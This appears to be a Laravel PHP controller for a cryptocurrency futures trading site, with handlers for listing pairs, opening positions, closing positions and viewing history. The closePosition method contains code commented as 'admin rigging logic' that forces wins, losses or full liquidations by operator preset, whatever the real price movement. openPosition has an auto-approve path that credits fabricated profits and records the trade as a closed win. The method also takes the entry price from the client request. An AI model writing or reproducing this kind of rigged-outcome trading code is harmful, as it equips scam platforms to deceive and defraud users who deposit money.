<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\Balance;
use App\Models\FuturesPair;
use App\Models\FuturesPosition;
use App\Models\Noti;
use App\Models\Site_setting;
use App\Models\SpotOrder;
use App\Models\UserWallet;
use App\Services\BinancePriceService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

class FuturesController extends Controller
{
    public function index()
    {
        $pairs = FuturesPair::where('status', 'active')->get();
        $defaultPair = $pairs->first();
        $positions = FuturesPosition::where('user_id', Auth::id())
            ->where('status', 'open')
            ->get();

        // Dynamically fetch live prices and 24h changes via centralized service (IN-MEMORY ONLY)
        try {
            $data = BinancePriceService::fetchAll();
            $priceMap = $data['priceMap'];
            $changeMap = $data['changeMap'];

            if ($priceMap) {
                foreach ($pairs as $pair) {
                    $sym = $pair->symbol;
                    if (isset($priceMap[$sym])) {
                        $pair->mark_price = $priceMap[$sym];
                        $pair->index_price = $priceMap[$sym];
                    }
                }
            }
        } catch (\Exception $e) {
            Log::error('Futures live price sync failed: '.$e->getMessage());
        }

        $assets = $pairs;

        $user = Auth::user();
        $orders = SpotOrder::where('user_id', $user->id)
            ->where('is_demo', $user->is_demo)
            ->latest()
            ->paginate(15);

        $usdBalance = Balance::where('user_id', $user->id)->where('symbol', 'usd')->first();
        $holdings = UserWallet::where('user_id', $user->id)
            ->get()
            ->keyBy('coin_symbol');

        $tickerData = BinancePriceService::get24hrTickerData() ?? [];

        $viewName = $this->isMobileView() ? 'mobile.exchange.futures' : 'exchange.futures';

        return view($viewName, compact('pairs', 'assets', 'defaultPair', 'positions', 'orders', 'usdBalance', 'holdings', 'tickerData'));
    }

    public function history()
    {
        $positions = FuturesPosition::where('user_id', Auth::id())
            ->whereIn('status', ['closed', 'liquidated'])
            ->orderBy('id', 'desc')
            ->get();

        $viewName = $this->isMobileView() ? 'mobile.exchange.futures_history' : 'exchange.futures_history';

        return view($viewName, compact('positions'));
    }

    public function openPosition(Request $request)
    {
        $request->validate([
            'pair_id' => 'required|exists:futures_pairs,id',
            'direction' => 'required|in:long,short',
            'leverage' => 'required|integer|min:1',
            'quantity' => 'required|numeric|min:0.0001',
            'margin_amount' => 'required|numeric|min:1',
            'entry_price' => 'required|numeric',
        ]);

        $pair = FuturesPair::findOrFail($request->pair_id);

        if ($request->leverage > $pair->max_leverage) {
            return redirect()->back()->with('error', 'Leverage exceeds maximum allowed.');
        }

        $liquidation_price = $request->direction === 'long'
            ? $request->entry_price * (1 - (1 / $request->leverage))
            : $request->entry_price * (1 + (1 / $request->leverage));

        $settings = Site_setting::first();
        $isDemo = Auth::user()->is_demo ? 1 : 0;
        $balanceColumn = $isDemo ? 'demo' : 'amount';

        $userBalance = DB::table('balances')
            ->where('user_id', Auth::id())
            ->where('symbol', 'usd')
            ->first();

        if (! $userBalance || $request->margin_amount > $userBalance->$balanceColumn) {
            return redirect()->back()->with('error', 'Insufficient balance.');
        }

        if ($settings && $settings->futures_auto_approve) {
            $profit = $request->margin_amount * ($settings->futures_auto_win_percent / 100);

            // Directly credit the profit since we bypass deducting the margin_amount
            DB::table('balances')
                ->where('user_id', Auth::id())
                ->where('symbol', 'usd')
                ->increment($balanceColumn, $profit);

            FuturesPosition::create([
                'user_id' => Auth::id(),
                'futures_pair_id' => $pair->id,
                'trade_id' => 'FUT'.strtoupper(uniqid()),
                'direction' => $request->direction,
                'leverage' => $request->leverage,
                'entry_price' => $request->entry_price,
                'quantity' => $request->quantity,
                'margin_amount' => $request->margin_amount,
                'liquidation_price' => $liquidation_price,
                'take_profit' => $request->take_profit,
                'stop_loss' => $request->stop_loss,
                'unrealized_pnl' => $profit,
                'realized_pnl' => $profit,
                'funding_paid' => 0,
                'status' => 'closed',
                'outcome_preset' => 'win',
                'is_demo' => $isDemo,
            ]);

            Noti::create([
                'user_id' => Auth::id(),
                'message' => 'Futures Auto-Approved: Your trade closed with $'.number_format($profit, 2).' profit.',
                'status' => 'unread',
            ]);

            if ($request->wantsJson()) {
                return response()->json(['status' => 'Futures trade auto-approved successfully. Profit: $'.number_format($profit, 2), 'profit' => $profit]);
            }

            return redirect()->back()->with('success', 'Futures trade auto-approved successfully. Profit: $'.number_format($profit, 2));
        }

        // Deduct margin_amount for non-auto-approved trades
        DB::table('balances')
            ->where('user_id', Auth::id())
            ->where('symbol', 'usd')
            ->decrement($balanceColumn, $request->margin_amount);

        $position = FuturesPosition::create([
            'user_id' => Auth::id(),
            'futures_pair_id' => $pair->id,
            'trade_id' => 'FUT'.strtoupper(uniqid()),
            'direction' => $request->direction,
            'leverage' => $request->leverage,
            'entry_price' => $request->entry_price,
            'quantity' => $request->quantity,
            'margin_amount' => $request->margin_amount,
            'liquidation_price' => $liquidation_price,
            'take_profit' => $request->take_profit,
            'stop_loss' => $request->stop_loss,
            'unrealized_pnl' => 0,
            'realized_pnl' => 0,
            'funding_paid' => 0,
            'status' => 'open',
            'approval_status' => 'pending',
            'is_demo' => $isDemo,
        ]);

        if ($request->wantsJson()) {
            return response()->json(['status' => 'pending_approval', 'position_id' => $position->id, 'type' => 'futures']);
        }

        return redirect()->back()->with('success', 'Futures position pending approval.');
    }

    public function closePosition(Request $request)
    {
        $position = FuturesPosition::where('id', $request->position_id)
            ->where('user_id', Auth::id())
            ->firstOrFail();

        // Calculate basic realized pnl using current mark price
        $markPrice = $position->futuresPair->mark_price;
        $priceDiff = $markPrice - $position->entry_price;
        if ($position->direction === 'short') {
            $priceDiff = $position->entry_price - $markPrice;
        }

        $pnl = $priceDiff * $position->quantity;

        // Apply admin rigging logic if an outcome preset is defined
        if ($position->outcome_preset == 'win' || $position->admin_status == 'win') {
            $pnl = abs($pnl) > 0 ? abs($pnl) : $position->margin_amount * 0.5; // guarantee profit
        } elseif ($position->outcome_preset == 'loss' || $position->admin_status == 'loss') {
            $pnl = -abs($pnl);
            if ($pnl == 0) {
                $pnl = -($position->margin_amount * 0.5);
            }
        } elseif ($position->outcome_preset == 'liquidated' || $position->admin_status == 'liquidated') {
            $pnl = -$position->margin_amount; // full loss
            $position->status = 'liquidated';
        } else {
            $position->status = 'closed';
        }

        $position->realized_pnl = $pnl;
        $position->save();

        return redirect()->back()->with('success', 'Position closed.');
    }
}
